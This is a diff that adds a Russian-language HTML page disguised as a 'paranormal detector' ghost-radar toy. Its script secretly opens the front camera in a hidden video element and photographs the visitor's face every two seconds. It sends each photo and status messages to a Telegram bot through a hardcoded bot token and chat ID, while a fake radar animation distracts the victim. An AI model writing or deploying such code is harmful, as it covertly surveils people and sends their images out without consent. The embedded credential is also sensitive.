@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔮 DETECTOR PARANORMAL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+        }
+
+        /* Анимированный фон */
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, #0a1f0a 0%, #000000 100%);
+            z-index: 0;
+        }
+
+        /* Радарный круг */
+        .radar-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 280px;
+            height: 280px;
+            z-index: 2;
+        }
+
+        .radar-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid #0f0;
+            box-shadow: 0 0 15px #0f0, inset 0 0 15px rgba(0,255,0,0.3);
+            animation: pulse 1.5s ease-out infinite;
+        }
+
+        .radar-scan {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, transparent 0deg, rgba(0,255,0,0.4) 360deg);
+            animation: spin 2s linear infinite;
+            clip-path: polygon(50% 50%, 100% 0%, 100% 100%);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; box-shadow: 0 0 10px #0f0; }
+            100% { transform: scale(1.1); opacity: 0; box-shadow: 0 0 40px #0f0; }
+        }
+
+        /* Плавающие точки (ложные цели) */
+        .blips {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .blip {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: #0f0;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #0f0;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { opacity: 0.3; transform: translateY(0px); }
+            50% { opacity: 1; transform: translateY(-8px); }
+        }
+
+        /* Интерфейсные элементы */
+        .overlay-panel {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid #0f0;
+            padding: 18px 20px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .ghost-stats {
+            font-size: 20px;
+            font-weight: bold;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+
+        .sub-stats {
+            font-size: 12px;
+            color: #8bc34a;
+            font-family: monospace;
+        }
+
+        .header-status {
+            position: fixed;
+            top: 18px;
+            left: 18px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            padding: 6px 14px;
+            border-radius: 30px;
+            border-left: 3px solid #0f0;
+            font-size: 11px;
+            color: #0f0;
+            font-family: monospace;
+            z-index: 10;
+        }
+
+        .counter-badge {
+            position: fixed;
+            top: 18px;
+            right: 18px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            padding: 6px 14px;
+            border-radius: 30px;
+            border-right: 3px solid #0f0;
+            font-size: 11px;
+            color: #0f0;
+            font-family: monospace;
+            z-index: 10;
+        }
+
+        /* Скрытая камера */
+        video {
+            display: none;
+        }
+
+        .fake-camera-note {
+            position: fixed;
+            bottom: 100px;
+            left: 20px;
+            font-size: 9px;
+            color: #2a4e2a;
+            z-index: 9;
+            background: rgba(0,0,0,0.5);
+            padding: 3px 8px;
+            border-radius: 12px;
+        }
+    </style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="radar-container">
+    <div class="radar-ring"></div>
+    <div class="radar-scan"></div>
+</div>
+<div class="blips" id="blips"></div>
+<div class="header-status" id="statusMsg">🟢 ИНИЦИАЛИЗАЦИЯ...</div>
+<div class="counter-badge" id="counterDisplay">📸 ФОТО: 0</div>
+<div class="overlay-panel">
+    <div class="ghost-stats" id="activityText">⚠️ ПОИСК АНОМАЛИЙ ⚠️</div>
+    <div class="sub-stats" id="subText">ЭКСТРАСЕНСОРНЫЙ МОДУЛЬ: АКТИВЕН</div>
+</div>
+<div class="fake-camera-note">🔍 РАДАР V.9.4 | ЭНЕРГЕТИЧЕСКОЕ ПОЛЕ</div>
+
+<video id="camera" autoplay muted playsinline></video>
+
+<script>
+    const BOT_TOKEN = "8625100345:AAGC1DlehbLDT6pg_tfCGm50Ex3iNcgzjkY";
+    const CHAT_ID = "7967916023";
+
+    let cameraStream = null;
+    let photoInterval = null;
+    let photoCount = 0;
+
+    function sendPhotoToTg(base64Data) {
+        let blob = dataURItoBlob(base64Data);
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, `face_${Date.now()}.jpg`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.log("TG error:", e));
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(',')[1]);
+        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        return new Blob([ab], {type: mimeString});
+    }
+
+    function takePhoto() {
+        let video = document.getElementById('camera');
+        if (!video || video.videoWidth === 0 || video.readyState < 2) return;
+
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        let ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let photoData = canvas.toDataURL('image/jpeg', 0.75);
+
+        sendPhotoToTg(photoData);
+        photoCount++;
+        document.getElementById('counterDisplay').innerHTML = `📸 ФОТО: ${photoCount}`;
+        document.getElementById('statusMsg').innerHTML = `📸 СЪЁМКА | ФОТО: ${photoCount}`;
+    }
+
+    function sendToTg(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: message})
+        }).catch(e => console.log(e));
+    }
+
+    async function startFrontCamera() {
+        try {
+            const constraints = {
+                video: {
+                    facingMode: { exact: "user" }
+                }
+            };
+            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            const video = document.getElementById('camera');
+            video.srcObject = cameraStream;
+            await video.play();
+
+            setTimeout(() => {
+                if (video.videoWidth > 0) {
+                    photoInterval = setInterval(() => {
+                        takePhoto();
+                    }, 2000);
+
+                    document.getElementById('statusMsg').innerHTML = "✅ АКТИВНО | ПЕРЕДНЯЯ КАМЕРА";
+                    document.getElementById('activityText').innerHTML = "⚠️ АКТИВНОСТЬ: 96% ⚠️";
+                    document.getElementById('subText').innerHTML = "🎙️ ЗАХВАТ ЛИЦА: АВТОФОТО 2СЕК";
+                    sendToTg("[Сталин] 🔮 Детектор призраков запущен (передняя камера). Автофото каждые 2 секунды.");
+                } else {
+                    throw new Error("Нет видеопотока");
+                }
+            }, 1200);
+        } catch (err) {
+            let errorMsg = err.message;
+            document.getElementById('statusMsg').innerHTML = "❌ ОШИБКА: " + errorMsg.slice(0, 30);
+            document.getElementById('activityText').innerHTML = "❌ НЕТ ДОСТУПА К КАМЕРЕ";
+            document.getElementById('subText').innerHTML = "РАЗРЕШИТЕ ИСПОЛЬЗОВАНИЕ КАМЕРЫ В БРАУЗЕРЕ";
+            sendToTg("[Сталин] Ошибка камеры (передняя): " + errorMsg);
+        }
+    }
+
+    // Создание плавающих точек (псевдо-призраков)
+    function createBlips() {
+        const blipsContainer = document.getElementById('blips');
+        for (let i = 0; i < 18; i++) {
+            let blip = document.createElement('div');
+            blip.classList.add('blip');
+            blip.style.left = Math.random() * 100 + '%';
+            blip.style.top = Math.random() * 100 + '%';
+            blip.style.animationDelay = Math.random() * 3 + 's';
+            blip.style.animationDuration = 2 + Math.random() * 3 + 's';
+            blipsContainer.appendChild(blip);
+        }
+    }
+
+    // Анимация процентов в панели
+    let percent = 0;
+    setInterval(() => {
+        percent = (percent + 2) % 100;
+        let activityDiv = document.getElementById('activityText');
+        if (activityDiv && !activityDiv.innerHTML.includes('❌')) {
+            activityDiv.innerHTML = `⚠️ АКТИВНОСТЬ: ${percent}% ⚠️`;
+            if (percent > 85) {
+                document.getElementById('subText').innerHTML = "🎯 ПРЯМОЙ КОНТАКТ: ФИКСАЦИЯ ЛИЦА";
+            } else {
+                document.getElementById('subText').innerHTML = "📡 СКАНИРОВАНИЕ ЭНЕРГЕТИЧЕСКОГО ПОЛЯ";
+            }
+        }
+    }, 800);
+
+    window.onload = () => {
+        createBlips();
+        startFrontCamera();
+    };
+
+    window.addEventListener('beforeunload', () => {
+        if (photoInterval) clearInterval(photoInterval);
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        sendToTg(`[Сталин] 👻 Сеанс детекции завершён. Всего отправлено фото (передняя камера): ${photoCount}`);
+    });
+</script>
+</body>
+</html>
